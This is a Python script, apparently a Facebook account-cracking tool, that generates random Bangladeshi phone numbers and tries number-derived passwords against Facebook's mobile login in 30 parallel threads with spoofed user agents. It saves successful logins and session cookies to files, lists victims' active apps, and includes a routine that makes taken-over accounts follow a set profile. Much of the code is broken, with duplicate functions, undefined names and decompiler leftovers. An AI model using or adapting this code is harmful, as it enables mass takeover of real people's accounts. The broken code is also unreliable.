#SCRIPT BY 《》HADI ANHAF AIMAN
import os
import sys
import time
import requests 
import uuid
def o():
    os.system('clear')
    jalan(logo)
    print('\033[1;95m==================================================')
    jalan('\033[1;92m[\033[1;91m1\033[1;92m]\033[1;95m RANDOM CRACK ')
    jalan('\033[1;92m[\033[1;91m2\033[1;92m]\033[1;95m CONTACT ME FACEBOOK')
    jalan('\033[1;92m[\033[1;91m3\033[1;92m]\033[1;95m FOLLOW PAGE')
    jalan('\033[1;92m[\033[1;91m0\033[1;92m]\033[1;91m EXIT')
    DIP = input('\n\x1b[1;32mCHOOSE : ')
    if DIP == '1':
        i()
    if DIP == '2':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100077855090738')
    if DIP == '3':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100077855090738')
    if DIP == '0':
        os.system('exit')
        return None


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except MuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",meth="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\033[1;91m%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{GREEN}'%(GREEN))
        for i in range(len(game)):
            print(f"\033[1;32m[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",meth="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\033[1;96m%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{RED}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text



class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.00010)

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
tay = date.tay()
logo = ("""
\033[1;31m  .d8888b.  8888888888 888b    888        d8888 Y88b   d88P 8888888888 888  
\033[1;32m d88P  Y88b 888        8888b   888       d88888  Y88b d88P  888        888      
\033[1;33m Y88b.      888        88888b  888      d88P888   Y88o88P   888        888      
\033[1;35m   "Y888b.  8888888    888Y88b 888     d88P 888    Y888P    8888888    888      
\033[1;37m     "Y88b. 888        888 Y88b888    d88P  888     888     888        888      
\033[1;33m       "888 888        888  Y88888   d88P   888     888     888        888      
\033[1;32m Y88b  d88P 888        888   Y8888  d8888888888     888     888        888      
\033[1;31m  "Y8888P"  8888888888 888    Y888 d88P     888     888     8888888888 88888888 
                                                                
\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mSENAYEL ISLAM DIP
\033[1;32m[+] \033[1;33mON FACEBOK   :  \033[1;32mSENSYEL ISLAM
\033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;31m《MAGIC》
\033[1;32m[+] \033[1;36mTOOL STATUS  :  \033[1;36mRANDOM
\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;31m3.11《MAX POWER》
\033[1;32m[+]==============================================""")
try:
    print("\033[1;92m\nTOOL UPDATE SUCCESSFUL\n")
    time.sleep(2)
    DIP()
    print("\033[1;91m\nYOUR DEVICE IS NOT SUPPORTED!\n")
    DIP()
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mPROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN\033[0;92m')


loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"


try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]

for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

def i():
	os.system('clear')
	print(logo)
	print(47*"-")
	print('\033[1;33m[1] 7 DIGIT CRACK BD 7️⃣')
	print('\033[1;32m[2] 8 DIGIT CRACK BD 8️⃣')
	print('[0] Back')
	print(47*'-')
	opt = input('[?] Choose : ')
	if opt =='1':
		random_number()
	elif opt =='2':
		random_pak_number()
	elif opt =='0':
		i()
	else:
		print('\033[1;91mChoose valid option\033[0;97m')

def random_number():
	user=[]
	os.system('clear')
	print(logo)
	print(47*"-")
	print('[+] ENTER ANY BD CE')
	print(47*'-')
	ke = input('[?] Input Ce : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(6))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;97m[$] Brute Has been started...(\033[1;32mBANGLADESH\033[1;97m)');print(47*"-");print('USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) ME BEFORE USE');print(47*"-")
		for guru in user:
			uid = ke+guru
			mk = uid[:6]
			pwx = [guru]
			pwx = [ke+guru,mk]
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back i')
	i()
	
    
def rcrack(uid,pwx,tl):
	global loop
	global oks
	global agents
	try:
		for ps in pwx:
			session = requests.Session()
			pro = random.choice(agents)
			free_fb = session.get('https://m.facebook.com/?zero_e=3&zero_et=1670779011&_rdc=1&_rdr&refsrc=deprecated').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'m.facebook.com',
			'meth': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encing': 'gzip, deflate, br',
			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
			'cache-control': 'max-age=0',
			'cookie': 'datr=BJeVYyOJlK8WcXco_RJTSGeA; sb=BZeVY7ZcTmvnPL9vw9ioqySh; m_pixel_ratio=1.631250023841858; wd=443x843; fr=0TxDKpLPaOhIaKymH..BjlgbY.Ak.AAA.0.0.Bjlgbz.AWXqqu2uReU',
			'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-me': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1', 
			'user-agent': pro,}
			lo = session.post('https://m.facebook.com/?zero_e=3&zero_et=1670779011&_rdc=1&_rdr&refsrc=deprecated/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\r\033[1;32m[DIP-OK] '+cid+' | '+ps)
				cek_apk(coki)
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\r\033[1;31m[DIP-CP] '+cid+' | '+ps)
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r \x1b[1;32m[ C R A C K ]\x1b[1;32m [{loop}|{tl}] \x1b[1;32m[Ok][{len(oks)}] [Cp][{len(cps)}]  ")
		sys.stdout.flush()
	except:
		pass
        

def random_pak_number():
	user=[]
	os.system('clear')
	print(logo)
	print(47*"-")
	print('[+] ENTER ANY BD CE')
	print(47*'-')
	ke = input('[?] Input Ce : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;97m[$] Brute Has been started...(\033[1;32mBANGLADESH\033[1;97m)');print(47*"-");print(' USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) ME BEFORE USE');print(47*"-")
		for guru in user:
			uid = ke+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back i')
	i()
    
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com/?zero_e=3&zero_et=1670779011&_rdc=1&_rdr&refsrc=deprecated').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'free.facebook.com',
            "meth": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			"accept-encing": 'gzip, deflate, br',
			"accept-language": 'en-GB,en-US;q=0.9,en;q=0.8',
			"cache-control": 'max-age=0',
			"cookie": 'datr=BJeVYyOJlK8WcXco_RJTSGeA; sb=BZeVY7ZcTmvnPL9vw9ioqySh; m_pixel_ratio=1.631250023841858; wd=443x843; fr=0TxDKpLPaOhIaKymH..BjlgbY.Ak.AAA.0.0.Bjlgbz.AWXqqu2uReU',
			"sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
			"sec-ch-ua-mobile": '?1',
			"sec-ch-ua-platform": '"Android"',
			"sec-fetch-dest": 'document',
			"sec-fetch-me": 'navigate',
			"sec-fetch-site": 'none',
			"sec-fetch-user": '?1',
			"upgrade-insecure-requests": '1', 
			"user-agent": pro,}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;32mDIP-OK ' +cid+ ' | ' +ps+    '  \n\033[1;33mCOOKIES : \033[1;32m'+coki+  ' \n\033[1;35mUSER-AGENT : \033[1;92m'+pro+'  \033[0;90m')
                cek_apk(session,coki)
                open('/sdcard/DIP-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;97mDIP-CP  ' +cid+ ' | ' +ps+           '  \n\033[1;35mUSER-AGENT : \033[1;92m'+pro+'  \033[0;90m')          
                open('/sdcard/DIP-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[C R A C K I N G] \033[1;96m[%s/%s] \033[1;32m[OK-%s] \033[1;35m[CP-%s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
	
o()
